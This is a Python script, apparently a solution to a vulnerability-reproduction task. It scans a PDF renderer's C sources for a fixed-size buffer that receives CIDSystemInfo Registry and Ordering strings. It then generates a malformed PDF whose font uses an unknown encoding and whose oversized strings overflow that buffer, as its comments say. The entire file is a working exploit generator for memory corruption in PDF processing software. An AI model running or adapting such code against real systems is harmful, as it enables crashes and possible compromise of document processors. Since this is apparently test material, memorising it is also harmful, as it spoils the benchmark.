import os
import re
import ast
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf_size = self._infer_fallback_buffer_size(src_path)
        if buf_size is None or buf_size < 16 or buf_size > 1_000_000:
            reg_len = 40000
            ord_len = 40000
        else:
            # Minimal-ish overflow: N registry chars + "-" + 1 ordering char + NUL -> overflows buf[N]
            reg_len = buf_size
            ord_len = 1

        registry = b"A" * reg_len
        ordering = b"B" * ord_len
        return self._build_pdf(registry, ordering)

    def _iter_text_files(self, src_path: str) -> Iterable[Tuple[str, str]]:
        exts = {
            ".c", ".cc", ".cpp", ".cxx",
            ".h", ".hh", ".hpp", ".hxx",
            ".m", ".mm",
            ".in", ".inc",
            ".y", ".l",
        }

        def want(name: str) -> bool:
            base = name.rsplit("/", 1)[-1]
            if base.startswith("."):
                return False
            low = name.lower()
            for ext in exts:
                if low.endswith(ext):
                    return True
            if low.endswith(("makefile", "cmakelists.txt", "configure.ac", "configure.in")):
                return True
            return False

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    path = os.path.join(root, fn)
                    rel = os.path.relpath(path, src_path)
                    if not want(rel.replace(os.sep, "/")):
                        continue
                    try:
                        with open(path, "rb") as f:
                            data = f.read(2_000_000)
                    except OSError:
                        continue
                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        text = data.decode("latin-1", "ignore")
                    yield rel.replace(os.sep, "/"), text
            return

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isreg():
                            continue
                        if m.size <= 0 or m.size > 2_000_000:
                            continue
                        name = m.name
                        if not want(name):
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        try:
                            text = data.decode("utf-8", "ignore")
                        except Exception:
                            text = data.decode("latin-1", "ignore")
                        yield name, text
            except Exception:
                return

    def _safe_eval_int_expr(self, expr: str, macros: Dict[str, int]) -> Optional[int]:
        expr = expr.strip()
        if not expr:
            return None

        if re.fullmatch(r"[0-9]+", expr):
            try:
                return int(expr)
            except Exception:
                return None

        if re.fullmatch(r"[A-Za-z_]\w*", expr):
            return macros.get(expr)

        if len(expr) > 128:
            return None
        if not re.fullmatch(r"[0-9A-Za-z_+\-*/()%<>&|^~ \t]+", expr):
            return None

        try:
            node = ast.parse(expr, mode="eval")
        except Exception:
            return None

        allowed_nodes = (
            ast.Expression, ast.BinOp, ast.UnaryOp, ast.Num, ast.Constant, ast.Name,
            ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Div, ast.Mod,
            ast.UAdd, ast.USub, ast.LShift, ast.RShift, ast.BitAnd, ast.BitOr, ast.BitXor,
            ast.Invert, ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,
        )

        def check(n: ast.AST) -> bool:
            if isinstance(n, ast.Expression):
                return check(n.body)
            if isinstance(n, ast.BinOp):
                return check(n.left) and check(n.right) and isinstance(n.op, (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Div, ast.Mod, ast.LShift, ast.RShift, ast.BitAnd, ast.BitOr, ast.BitXor))
            if isinstance(n, ast.UnaryOp):
                return check(n.operand) and isinstance(n.op, (ast.UAdd, ast.USub, ast.Invert))
            if isinstance(n, ast.Name):
                return n.id in macros
            if isinstance(n, ast.Num):
                return True
            if isinstance(n, ast.Constant):
                return isinstance(n.value, int)
            return False

        if not check(node):
            return None

        try:
            val = eval(compile(node, "<expr>", "eval"), {"__builtins__": {}}, dict(macros))
        except Exception:
            return None
        if not isinstance(val, int):
            try:
                val = int(val)
            except Exception:
                return None
        if val <= 0:
            return None
        if val > 10_000_000:
            return None
        return val

    def _infer_fallback_buffer_size(self, src_path: str) -> Optional[int]:
        macro_map: Dict[str, int] = {}
        relevant: List[Tuple[str, str]] = []

        define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+([0-9]+)\b", re.M)
        for name, text in self._iter_text_files(src_path):
            for m in define_re.finditer(text):
                k = m.group(1)
                try:
                    v = int(m.group(2))
                except Exception:
                    continue
                if 0 < v <= 10_000_000 and k not in macro_map:
                    macro_map[k] = v
            if ("CIDSystemInfo" in text) or (("Registry" in text) and ("Ordering" in text)):
                relevant.append((name, text))

        candidates: List[int] = []

        # Prefer patterns that explicitly build "<registry>-<ordering>" via sprintf-like APIs.
        fmt_re = re.compile(
            r"\b(?:(?:gs_|fz_)?snprintf|(?:gs_|fz_)?sprintf|sprintf)\s*\(\s*([A-Za-z_]\w*)\s*,\s*(?:[A-Za-z_]\w*\s*,\s*)?\"[^\"]*%s\s*-\s*%s[^\"]*\"",
            re.S,
        )
        decl_re_tpl = r"\b(?:unsigned\s+char|signed\s+char|char|gs_char|byte|uint8_t)\s+{var}\s*\[\s*([^\]]+)\s*\]"
        for _, text in relevant:
            for m in fmt_re.finditer(text):
                dst = m.group(1)
                w0 = max(0, m.start() - 800)
                w1 = min(len(text), m.end() + 800)
                window = text[w0:w1]
                if "Registry" not in window or "Ordering" not in window:
                    continue
                decl_re = re.compile(decl_re_tpl.format(var=re.escape(dst)))
                d = decl_re.search(window)
                if not d:
                    # Search a bit further back in the file
                    w0b = max(0, m.start() - 5000)
                    window2 = text[w0b:w1]
                    d = decl_re.search(window2)
                if d:
                    expr = d.group(1)
                    val = self._safe_eval_int_expr(expr, macro_map)
                    if val is not None and 8 <= val <= 1_000_000:
                        candidates.append(val)

        # Fallback heuristic: look for any small-ish stack arrays near the CIDSystemInfo fallback logic.
        if not candidates:
            near_re = re.compile(r"(CIDSystemInfo.{0,4000}Registry.{0,4000}Ordering)|(Registry.{0,4000}Ordering.{0,4000}CIDSystemInfo)", re.S)
            any_decl_re = re.compile(r"\b(?:unsigned\s+char|signed\s+char|char|gs_char|byte|uint8_t)\s+[A-Za-z_]\w*\s*\[\s*([^\]]+)\s*\]")
            for _, text in relevant:
                if not near_re.search(text):
                    continue
                for dm in any_decl_re.finditer(text):
                    expr = dm.group(1)
                    val = self._safe_eval_int_expr(expr, macro_map)
                    if val is None:
                        continue
                    if 16 <= val <= 8192:
                        candidates.append(val)

        if not candidates:
            return None

        # Conservative: choose the maximum candidate to ensure overflow.
        return max(candidates)

    def _build_pdf(self, registry: bytes, ordering: bytes) -> bytes:
        def pdf_str_literal(data: bytes) -> bytes:
            # Only using A/B bytes, so no escaping needed.
            return b"(" + data + b")"

        # Objects:
        # 1: Catalog
        # 2: Pages
        # 3: Page
        # 4: Type0 Font (invalid encoding forces fallback)
        # 5: Descendant CIDFontType2 with long CIDSystemInfo strings
        # 7: FontDescriptor
        # 8: Contents stream
        objs: Dict[int, bytes] = {}

        objs[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
        objs[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        objs[3] = b"<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /MediaBox [0 0 612 792] /Contents 8 0 R >>"

        # Force a missing/unknown encoding name to provoke fallback behavior.
        objs[4] = b"<< /Type /Font /Subtype /Type0 /BaseFont /NoSuchType0Font /Encoding /NoSuchCMap /DescendantFonts [5 0 R] >>"

        cid_sys = b"<< /Registry " + pdf_str_literal(registry) + b" /Ordering " + pdf_str_literal(ordering) + b" /Supplement 0 >>"
        objs[5] = (
            b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /NoSuchCIDFont "
            b"/CIDSystemInfo " + cid_sys +
            b" /FontDescriptor 7 0 R /DW 1000 /W [0 [1000]] /CIDToGIDMap /Identity >>"
        )

        objs[7] = (
            b"<< /Type /FontDescriptor /FontName /NoSuchCIDFont "
            b"/Flags 4 /FontBBox [0 0 0 0] /ItalicAngle 0 "
            b"/Ascent 0 /Descent 0 /CapHeight 0 /StemV 0 >>"
        )

        stream = b"q\nBT\n/F1 12 Tf\n72 720 Td\n<0001> Tj\nET\nQ\n"
        objs[8] = b"<< /Length " + str(len(stream)).encode("ascii") + b" >>\nstream\n" + stream + b"endstream"

        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
        out = bytearray()
        out += header

        offsets: Dict[int, int] = {}
        max_obj = max(objs.keys())

        for objnum in range(1, max_obj + 1):
            if objnum not in objs:
                continue
            offsets[objnum] = len(out)
            out += str(objnum).encode("ascii") + b" 0 obj\n"
            out += objs[objnum]
            out += b"\nendobj\n"

        xref_pos = len(out)
        out += b"xref\n"
        out += b"0 " + str(max_obj + 1).encode("ascii") + b"\n"
        out += b"0000000000 65535 f \n"
        for objnum in range(1, max_obj + 1):
            off = offsets.get(objnum, 0)
            out += f"{off:010d} 00000 n \n".encode("ascii")

        out += b"trailer\n"
        out += b"<< /Size " + str(max_obj + 1).encode("ascii") + b" /Root 1 0 R >>\n"
        out += b"startxref\n"
        out += str(xref_pos).encode("ascii") + b"\n"
        out += b"%%EOF\n"
        return bytes(out)